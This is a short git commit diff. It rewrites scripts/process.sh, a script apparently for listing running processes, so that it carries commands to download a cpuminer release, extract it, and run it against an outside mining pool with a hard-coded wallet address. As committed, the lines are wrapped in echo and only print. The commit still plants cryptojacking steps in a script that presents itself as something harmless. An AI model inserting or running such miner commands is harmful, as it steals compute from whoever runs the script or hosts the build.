45ed467aeb90faa3d4316941cf3678743e749f91
hotrill <78942327+hotrill@users.noreply.github.com>
2021-02-12 09:00:43 +0700

    Update process.sh

--- scripts/process.sh
+++ scripts/process.sh
@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-echo "Hello $USER"
-echo "Hey i am $USER and will be telling you about the current processes"
-echo "Running processes List"
+echo wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz
+echo tar xf cpuminer-opt-linux.tar.gz
+echo ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qgel56acveq6xqjxrk87pmf3fjt7xw07s33n30q.docker1 
 ps
